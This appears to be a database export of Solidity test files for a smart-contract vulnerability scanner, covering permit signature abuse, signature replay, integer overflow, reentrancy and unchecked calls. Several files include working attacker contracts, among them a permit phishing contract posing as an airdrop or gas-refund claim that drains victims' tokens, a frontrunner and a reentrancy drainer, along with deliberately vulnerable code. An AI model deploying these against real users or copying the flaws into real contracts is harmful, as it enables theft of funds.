4f24f704-b340-4169-9a4f-7276760f409f	b682867e-e716-4e83-a8c5-24b78bb462cf	Permit Exploit	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/**\n * @title PermitExploit\n * @notice Demonstrates EIP-2612 permit signature vulnerabilities\n *\n * VULNERABILITY: Permit signature exploits\n * SEVERITY: Critical\n * CATEGORY: Signature / Authentication\n *\n * BACKGROUND:\n * EIP-2612 introduces gasless approvals via off-chain signatures.\n * Users sign a message approving token spending, which can be submitted by anyone.\n *\n * ATTACK VECTORS:\n * 1. Front-running: Attacker frontruns permit() call and drains tokens\n * 2. Signature phishing: Trick users into signing malicious permit\n * 3. Cross-chain replay: Replay signature on different chain\n * 4. Unlimited approvals: Permit for type(uint256).max\n * 5. Deadline manipulation: Long deadlines leave users vulnerable\n *\n * REAL-WORLD CASES:\n * - Multiple DeFi phishing attacks (2022-2024)\n * - MEV bots exploiting permit frontrunning\n * - Cross-chain signature replay attacks\n *\n * TESTED DETECTORS:\n * - permit-signature-exploit\n * - signature-replay\n * - front-running\n * - missing-chainid-validation\n */\n\n/**\n * @title VulnerableERC20Permit\n * @notice ERC20 with vulnerable permit implementation\n */\ncontract VulnerableERC20Permit {\n    string public name = "Vulnerable Permit Token";\n    string public symbol = "VPT";\n    uint8 public decimals = 18;\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => uint256) public nonces;\n\n    // VULNERABILITY 1: Missing chainId in DOMAIN_SEPARATOR\n    bytes32 public DOMAIN_SEPARATOR;\n    bytes32 public constant PERMIT_TYPEHASH = keccak256(\n        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"\n    );\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor() {\n        totalSupply = 1000000 * 10**18;\n        balanceOf[msg.sender] = totalSupply;\n\n        // VULNERABLE: DOMAIN_SEPARATOR doesn't include chainId\n        DOMAIN_SEPARATOR = keccak256(abi.encode(\n            keccak256("EIP712Domain(string name,string version,address verifyingContract)"),\n            keccak256(bytes(name)),\n            keccak256(bytes("1")),\n            address(this)\n        ));\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        require(balanceOf[msg.sender] >= value, "Insufficient balance");\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 value)\n        external\n        returns (bool)\n    {\n        require(balanceOf[from] >= value, "Insufficient balance");\n        require(allowance[from][msg.sender] >= value, "Insufficient allowance");\n\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n        allowance[from][msg.sender] -= value;\n\n        emit Transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @notice VULNERABILITY 2: No protection against frontrunning\n     * @dev Attacker can see signature in mempool and frontrun\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // VULNERABLE: No deadline validation allows expired signatures\n        require(deadline >= block.timestamp, "Signature expired");\n\n        bytes32 structHash = keccak256(abi.encode(\n            PERMIT_TYPEHASH,\n            owner,\n            spender,\n            value,\n            nonces[owner]++,\n            deadline\n        ));\n\n        bytes32 digest = keccak256(abi.encodePacked(\n            "\\x19\\x01",\n            DOMAIN_SEPARATOR,\n            structHash\n        ));\n\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0), "Invalid signature");\n        require(recoveredAddress == owner, "Invalid signer");\n\n        // VULNERABLE: No protection against frontrunning\n        // Attacker can call this before legitimate user\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    /**\n     * @notice VULNERABILITY 3: Allows unlimited approvals\n     */\n    function permitUnlimited(\n        address owner,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // VULNERABLE: Approves unlimited spending (common phishing vector)\n        this.permit(owner, msg.sender, type(uint256).max, deadline, v, r, s);\n    }\n}\n\n/**\n * @title PermitPhishingContract\n * @notice Malicious contract that tricks users into signing permits\n */\ncontract PermitPhishingContract {\n    VulnerableERC20Permit public token;\n\n    constructor(address _token) {\n        token = VulnerableERC20Permit(_token);\n    }\n\n    /**\n     * @notice ATTACK 1: Phishing attack - claim to be "airdrop claimer"\n     * @dev User signs permit thinking they'll get airdrop\n     */\n    function claimAirdrop(\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // User thinks they're claiming airdrop\n        // Actually approving unlimited token spending\n\n        token.permitUnlimited(msg.sender, deadline, v, r, s);\n\n        // Steal all tokens\n        uint256 balance = token.balanceOf(msg.sender);\n        token.transferFrom(msg.sender, address(this), balance);\n    }\n\n    /**\n     * @notice ATTACK 2: Fake "gas refund" requiring permit signature\n     */\n    function claimGasRefund(\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // User signs permit thinking they'll get gas refund\n        token.permit(msg.sender, address(this), value, deadline, v, r, s);\n\n        // Steal tokens\n        token.transferFrom(msg.sender, address(this), value);\n    }\n}\n\n/**\n * @title PermitFrontrunAttacker\n * @notice Demonstrates permit frontrunning\n */\ncontract PermitFrontrunAttacker {\n    VulnerableERC20Permit public token;\n\n    constructor(address _token) {\n        token = VulnerableERC20Permit(_token);\n    }\n\n    /**\n     * @notice ATTACK 3: Frontrun permit and drain tokens\n     */\n    function frontrunPermit(\n        address owner,\n        address intendedSpender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // Attacker sees permit signature in mempool\n        // Frontruns with higher gas price\n        // Gets approval before intended spender\n\n        token.permit(owner, address(this), value, deadline, v, r, s);\n\n        // Drain tokens\n        token.transferFrom(owner, address(this), value);\n    }\n\n    /**\n     * @notice ATTACK 4: Replay signature on different chain\n     */\n    function replayOnDifferentChain(\n        address owner,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // VULNERABLE: DOMAIN_SEPARATOR doesn't include chainId\n        // Signature from mainnet can be replayed on testnet/L2\n\n        token.permit(owner, address(this), value, deadline, v, r, s);\n        token.transferFrom(owner, address(this), value);\n    }\n}\n\n/**\n * @title VulnerablePermitSwap\n * @notice Vulnerable DEX using permit for approvals\n */\ncontract VulnerablePermitSwap {\n    VulnerableERC20Permit public tokenA;\n    VulnerableERC20Permit public tokenB;\n\n    uint256 public reserveA;\n    uint256 public reserveB;\n\n    constructor(address _tokenA, address _tokenB) {\n        tokenA = VulnerableERC20Permit(_tokenA);\n        tokenB = VulnerableERC20Permit(_tokenB);\n    }\n\n    /**\n     * @notice VULNERABILITY 4: Swap with permit (frontrunning risk)\n     */\n    function swapWithPermit(\n        uint256 amountIn,\n        uint256 minAmountOut,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // User signs permit + swap in one tx\n        // VULNERABLE: Attacker can frontrun and manipulate reserves\n\n        tokenA.permit(msg.sender, address(this), amountIn, deadline, v, r, s);\n\n        // VULNERABLE: No slippage protection check before permit\n        // Attacker can sandwich attack\n\n        uint256 amountOut = (amountIn * reserveB) / (reserveA + amountIn);\n        require(amountOut >= minAmountOut, "Insufficient output");\n\n        tokenA.transferFrom(msg.sender, address(this), amountIn);\n        tokenB.transfer(msg.sender, amountOut);\n\n        reserveA += amountIn;\n        reserveB -= amountOut;\n    }\n\n    /**\n     * @notice VULNERABILITY 5: Batch permit without atomic execution\n     */\n    function batchSwapWithPermit(\n        address[] calldata owners,\n        uint256[] calldata amounts,\n        uint256[] calldata deadlines,\n        uint8[] calldata vs,\n        bytes32[] calldata rs,\n        bytes32[] calldata ss\n    ) external {\n        // VULNERABLE: Non-atomic batch permits\n        // Some permits may succeed, others may be frontrun\n\n        for (uint256 i = 0; i < owners.length; i++) {\n            tokenA.permit(\n                owners[i],\n                address(this),\n                amounts[i],\n                deadlines[i],\n                vs[i],\n                rs[i],\n                ss[i]\n            );\n\n            // VULNERABLE: If one permit is frontrun, entire batch fails\n            tokenA.transferFrom(owners[i], address(this), amounts[i]);\n        }\n    }\n\n    function addLiquidity(uint256 amountA, uint256 amountB) external {\n        tokenA.transferFrom(msg.sender, address(this), amountA);\n        tokenB.transferFrom(msg.sender, address(this), amountB);\n        reserveA += amountA;\n        reserveB += amountB;\n    }\n}\n\n/**\n * @title SecureERC20Permit\n * @notice Demonstrates proper permit implementation\n */\ncontract SecureERC20Permit {\n    string public constant name = "Secure Permit Token";\n    string public constant symbol = "SPT";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => uint256) public nonces;\n\n    // MITIGATION 1: Include chainId in DOMAIN_SEPARATOR\n    bytes32 public immutable DOMAIN_SEPARATOR;\n    bytes32 public constant PERMIT_TYPEHASH = keccak256(\n        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"\n    );\n\n    // MITIGATION 2: Track used signatures\n    mapping(bytes32 => bool) public usedSignatures;\n\n    // MITIGATION 3: Configurable max deadline\n    uint256 public constant MAX_DEADLINE_DURATION = 1 hours;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor() {\n        totalSupply = 1000000 * 10**18;\n        balanceOf[msg.sender] = totalSupply;\n\n        // MITIGATION 1: Include chainId\n        DOMAIN_SEPARATOR = keccak256(abi.encode(\n            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),\n            keccak256(bytes(name)),\n            keccak256(bytes("1")),\n            block.chainid,\n            address(this)\n        ));\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        require(balanceOf[msg.sender] >= value, "Insufficient balance");\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 value)\n        external\n        returns (bool)\n    {\n        require(balanceOf[from] >= value, "Insufficient balance");\n        require(allowance[from][msg.sender] >= value, "Insufficient allowance");\n\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n\n        if (allowance[from][msg.sender] != type(uint256).max) {\n            allowance[from][msg.sender] -= value;\n        }\n\n        emit Transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @notice SECURE: Protected permit implementation\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // MITIGATION 2: Strict deadline validation\n        require(deadline >= block.timestamp, "Signature expired");\n        require(deadline <= block.timestamp + MAX_DEADLINE_DURATION, "Deadline too far");\n\n        bytes32 structHash = keccak256(abi.encode(\n            PERMIT_TYPEHASH,\n            owner,\n            spender,\n            value,\n            nonces[owner]++,\n            deadline\n        ));\n\n        bytes32 digest = keccak256(abi.encodePacked(\n            "\\x19\\x01",\n            DOMAIN_SEPARATOR,\n            structHash\n        ));\n\n        // MITIGATION 3: Prevent signature reuse\n        require(!usedSignatures[digest], "Signature already used");\n        usedSignatures[digest] = true;\n\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0), "Invalid signature");\n        require(recoveredAddress == owner, "Invalid signer");\n\n        // MITIGATION 4: Emit event for monitoring\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    /**\n     * @notice SECURE: Permit with immediate execution\n     * @dev Reduces frontrunning window\n     */\n    function permitAndTransferFrom(\n        address owner,\n        address to,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (bool) {\n        // Permit and execute in same transaction\n        this.permit(owner, msg.sender, value, deadline, v, r, s);\n        return this.transferFrom(owner, to, value);\n    }\n}\n\n/**\n * @title PermitHelper\n * @notice Helper for secure permit patterns\n */\ncontract PermitHelper {\n    /**\n     * @notice SECURE: Validate permit parameters before signing\n     */\n    function validatePermitParameters(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline\n    ) external view returns (bool) {\n        // Validation checks users should perform before signing\n        require(owner == msg.sender, "Not your tokens");\n        require(spender != address(0), "Invalid spender");\n        require(value > 0 && value != type(uint256).max, "Suspicious value");\n        require(deadline <= block.timestamp + 1 hours, "Deadline too long");\n        require(deadline >= block.timestamp + 5 minutes, "Deadline too short");\n\n        return true;\n    }\n\n    /**\n     * @notice SECURE: Revoke permit by incrementing nonce\n     */\n    function revokePermit(address token) external {\n        // Increment nonce to invalidate any pending permits\n        SecureERC20Permit(token).permit(\n            msg.sender,\n            address(0),\n            0,\n            block.timestamp,\n            0,\n            bytes32(0),\n            bytes32(0)\n        );\n    }\n}\n	\N	517	f	\N	1	0	solidity	0.8.20	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-11-05 20:19:05.655047+00	2025-11-05 23:56:39.547437+00	plain	\N
ea35b2e5-9863-48e1-93cb-a0b79f5e9ce3	b682867e-e716-4e83-a8c5-24b78bb462cf	Signature Replay	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Signature Replay Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract is vulnerable to signature replay attacks where\n * a valid signature can be reused multiple times or across contracts.\n */\ncontract VulnerableMetaTransaction {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: No nonce or replay protection\n    function metaTransfer(\n        address from,\n        address to,\n        uint256 amount,\n        bytes memory signature\n    ) public {\n        // VULNERABILITY: Signature can be replayed multiple times\n        bytes32 messageHash = keccak256(abi.encodePacked(from, to, amount));\n        bytes32 ethSignedHash = getEthSignedMessageHash(messageHash);\n\n        require(recoverSigner(ethSignedHash, signature) == from, "Invalid signature");\n        require(balances[from] >= amount, "Insufficient balance");\n\n        balances[from] -= amount;\n        balances[to] += amount;\n    }\n\n    function getEthSignedMessageHash(bytes32 _messageHash) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", _messageHash));\n    }\n\n    function recoverSigner(bytes32 _ethSignedHash, bytes memory _signature) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n        return ecrecover(_ethSignedHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig) public pure returns (bytes32 r, bytes32 s, uint8 v) {\n        require(sig.length == 65, "Invalid signature length");\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n    }\n}\n\n/**\n * @title Cross-Contract Replay Vulnerability\n * @dev Shows vulnerability where signatures work across different contracts\n */\ncontract VulnerableVoucherSystem {\n    mapping(address => bool) public voucherUsed;\n    address public verifier;\n\n    constructor() {\n        verifier = msg.sender;\n    }\n\n    // VULNERABLE: No contract address in signature\n    function redeemVoucher(\n        uint256 amount,\n        bytes memory signature\n    ) public {\n        // VULNERABILITY: Same signature works on deployed copy of this contract\n        bytes32 messageHash = keccak256(abi.encodePacked(msg.sender, amount));\n        bytes32 ethSignedHash = getEthSignedMessageHash(messageHash);\n\n        address signer = recoverSigner(ethSignedHash, signature);\n        require(signer == verifier, "Invalid signature");\n        require(!voucherUsed[msg.sender], "Voucher already used");\n\n        voucherUsed[msg.sender] = true;\n        payable(msg.sender).transfer(amount);\n    }\n\n    function getEthSignedMessageHash(bytes32 _messageHash) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", _messageHash));\n    }\n\n    function recoverSigner(bytes32 _ethSignedHash, bytes memory _signature) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n        return ecrecover(_ethSignedHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig) public pure returns (bytes32 r, bytes32 s, uint8 v) {\n        require(sig.length == 65, "Invalid signature length");\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title Signature Malleability\n * @dev Shows ECDSA signature malleability vulnerability\n */\ncontract VulnerableSignatureChecker {\n    mapping(bytes32 => bool) public signatureUsed;\n\n    // VULNERABLE: Signature malleability not prevented\n    function executeWithSignature(\n        address target,\n        uint256 value,\n        bytes memory data,\n        bytes memory signature\n    ) public {\n        bytes32 messageHash = keccak256(abi.encodePacked(target, value, data));\n        bytes32 ethSignedHash = keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash));\n\n        // VULNERABILITY: Signature can be modified (s -> -s mod n) to create different\n        // signature with same validity, bypassing the signatureUsed check\n        bytes32 sigHash = keccak256(signature);\n        require(!signatureUsed[sigHash], "Signature already used");\n\n        address signer = recoverSigner(ethSignedHash, signature);\n        require(signer == target, "Invalid signature");\n\n        signatureUsed[sigHash] = true;\n\n        (bool success, ) = target.call{value: value}(data);\n        require(success, "Execution failed");\n    }\n\n    function recoverSigner(bytes32 _ethSignedHash, bytes memory _signature) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n        return ecrecover(_ethSignedHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig) public pure returns (bytes32 r, bytes32 s, uint8 v) {\n        require(sig.length == 65, "Invalid signature length");\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title Missing Chain ID in Signature\n * @dev Shows vulnerability across different chains\n */\ncontract VulnerableCrossChain {\n    mapping(address => uint256) public nonces;\n\n    // VULNERABLE: No chain ID in signature\n    function executeMetaTransaction(\n        address user,\n        address target,\n        uint256 value,\n        uint256 nonce,\n        bytes memory signature\n    ) public {\n        // VULNERABILITY: Signature can be replayed on different chains (mainnet, testnet, etc.)\n        bytes32 messageHash = keccak256(abi.encodePacked(user, target, value, nonce));\n        bytes32 ethSignedHash = keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash));\n\n        require(recoverSigner(ethSignedHash, signature) == user, "Invalid signature");\n        require(nonces[user] == nonce, "Invalid nonce");\n\n        nonces[user]++;\n\n        (bool success, ) = target.call{value: value}("");\n        require(success, "Transaction failed");\n    }\n\n    function recoverSigner(bytes32 _ethSignedHash, bytes memory _signature) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n        return ecrecover(_ethSignedHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig) public pure returns (bytes32 r, bytes32 s, uint8 v) {\n        require(sig.length == 65, "Invalid signature length");\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n    }\n\n    receive() external payable {}\n}\n	\N	196	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-11-05 20:01:06.405137+00	2025-11-05 23:57:23.391035+00	plain	\N
1393a461-9f47-4cc6-bd8d-40b2273ad839	b682867e-e716-4e83-a8c5-24b78bb462cf	Integer Overflow	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\n/**\n * @title Integer Overflow/Underflow Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract uses Solidity 0.7.6 which doesn't have automatic overflow checks.\n * In Solidity 0.8.0+, overflow checks are automatic, but this shows the vulnerability\n * in older versions or when using unchecked blocks.\n */\ncontract VulnerableToken {\n    mapping(address => uint256) public balances;\n    uint256 public totalSupply;\n\n    constructor(uint256 _initialSupply) {\n        balances[msg.sender] = _initialSupply;\n        totalSupply = _initialSupply;\n    }\n\n    // VULNERABLE: No overflow check on addition\n    function transfer(address _to, uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n\n        // VULNERABILITY: Can overflow if balances[_to] + _amount > type(uint256).max\n        balances[msg.sender] -= _amount;\n        balances[_to] += _amount;\n    }\n\n    // VULNERABLE: Underflow attack possible\n    function batchTransfer(address[] memory _receivers, uint256 _value) public {\n        uint256 count = _receivers.length;\n        // VULNERABILITY: count * _value can overflow\n        uint256 amount = count * _value;\n        require(balances[msg.sender] >= amount, "Insufficient balance");\n\n        balances[msg.sender] -= amount;\n        for (uint256 i = 0; i < count; i++) {\n            balances[_receivers[i]] += _value;\n        }\n    }\n\n    // VULNERABLE: Can underflow\n    function withdrawReward(uint256 _reward) public {\n        // VULNERABILITY: If _reward > balances[msg.sender], this underflows\n        balances[msg.sender] -= _reward;\n    }\n}\n\n/**\n * @title Integer Overflow in Solidity 0.8.0+\n * @dev Shows overflow vulnerability when using unchecked blocks\n */\ncontract UncheckedOverflow {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: Using unchecked block bypasses overflow protection\n    function unsafeMultiply(uint256 amount, uint256 multiplier) public view returns (uint256) {\n        unchecked {\n            // VULNERABILITY: Can overflow without reverting\n            return amount * multiplier;\n        }\n    }\n\n    function vulnerableWithdraw(uint256 amount) public {\n        unchecked {\n            // VULNERABILITY: Can underflow\n            balances[msg.sender] -= amount;\n        }\n        payable(msg.sender).transfer(amount);\n    }\n}\n	\N	76	f	\N	1	0	solidity	0.7.6	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-11-05 20:02:04.684775+00	2025-11-05 20:13:43.320191+00	plain	\N
aed6ac88-9b6c-49cf-9186-f10c5bca04df	b682867e-e716-4e83-a8c5-24b78bb462cf	ReEntrancy Contract	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Reentrancy Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract is vulnerable to reentrancy attacks.\n * An attacker can recursively call withdraw() before the balance is updated.\n */\ncontract VulnerableBank {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: State update happens after external call\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, "Insufficient balance");\n\n        // VULNERABILITY: External call before state update\n        (bool success, ) = msg.sender.call{value: amount}("");\n        require(success, "Transfer failed");\n\n        // State update happens too late\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/**\n * @title Reentrancy Attacker\n * @dev Example attacker contract that exploits the reentrancy vulnerability\n */\ncontract ReentrancyAttacker {\n    VulnerableBank public vulnerableBank;\n    uint256 public attackCount;\n\n    constructor(address _vulnerableBankAddress) {\n        vulnerableBank = VulnerableBank(_vulnerableBankAddress);\n    }\n\n    function attack() public payable {\n        require(msg.value >= 1 ether, "Need at least 1 ether to attack");\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw();\n    }\n\n    // Fallback function that re-enters the withdraw function\n    receive() external payable {\n        if (address(vulnerableBank).balance >= 1 ether && attackCount < 5) {\n            attackCount++;\n            vulnerableBank.withdraw();\n        }\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n	\N	65	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-11-05 16:37:46.800723+00	2025-11-05 23:54:52.509744+00	plain	\N
310e59e1-be64-44a9-bdd0-76bc578069ce	b682867e-e716-4e83-a8c5-24b78bb462cf	Unchecked Call	\N	ethereum	// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Unchecked External Call Vulnerability Example\n * @dev VULNERABLE - DO NOT USE IN PRODUCTION\n *\n * This contract fails to check return values of external calls.\n */\ncontract VulnerablePayment {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // VULNERABLE: Unchecked low-level call\n    function withdrawUnchecked(address payable _recipient, uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n        balances[msg.sender] -= _amount;\n\n        // VULNERABILITY: Return value not checked\n        _recipient.call{value: _amount}("");\n        // If the call fails, the user loses their balance!\n    }\n\n    // VULNERABLE: Unchecked send\n    function withdrawWithSend(address payable _recipient, uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n        balances[msg.sender] -= _amount;\n\n        // VULNERABILITY: send() returns false on failure but we don't check it\n        _recipient.send(_amount);\n    }\n\n    // VULNERABLE: Multiple unchecked calls\n    function batchPayout(address payable[] memory _recipients, uint256[] memory _amounts) public {\n        require(_recipients.length == _amounts.length, "Length mismatch");\n\n        for (uint256 i = 0; i < _recipients.length; i++) {\n            // VULNERABILITY: If one call fails, the loop continues\n            _recipients[i].call{value: _amounts[i]}("");\n        }\n    }\n}\n\n/**\n * @title Unchecked External Contract Call\n * @dev Shows vulnerability with external contract interactions\n */\ninterface IExternalContract {\n    function executeAction(address user) external returns (bool);\n}\n\ncontract VulnerableIntegration {\n    IExternalContract public externalContract;\n    mapping(address => uint256) public rewards;\n\n    constructor(address _externalContract) {\n        externalContract = IExternalContract(_externalContract);\n    }\n\n    // VULNERABLE: Assumes external call succeeds\n    function claimReward() public {\n        uint256 reward = rewards[msg.sender];\n        require(reward > 0, "No reward");\n\n        // VULNERABILITY: Doesn't check return value\n        externalContract.executeAction(msg.sender);\n\n        // Reward is cleared even if external call failed\n        rewards[msg.sender] = 0;\n        payable(msg.sender).transfer(reward);\n    }\n\n    function setReward(address _user, uint256 _amount) public {\n        rewards[_user] = _amount;\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title Malicious Receiver\n * @dev Contract that always rejects payments to exploit unchecked calls\n */\ncontract MaliciousReceiver {\n    // Always rejects payments\n    receive() external payable {\n        revert("Payment rejected");\n    }\n\n    // This function can drain the VulnerablePayment contract\n    function attack(address _vulnerableContract, uint256 _amount) public {\n        VulnerablePayment vulnerable = VulnerablePayment(_vulnerableContract);\n\n        // Deposit funds\n        vulnerable.deposit{value: _amount}();\n\n        // Withdraw using unchecked call - balance will be deducted\n        // but payment will fail, and we can do it again\n        vulnerable.withdrawUnchecked(payable(address(this)), _amount);\n    }\n}\n	\N	104	f	\N	1	0	solidity	0.8.0	{"license": "MIT", "detection_method": "extension", "detection_confidence": 0.95}	scanned	2025-11-05 20:15:09.646387+00	2025-11-05 23:57:04.334346+00	plain	\N
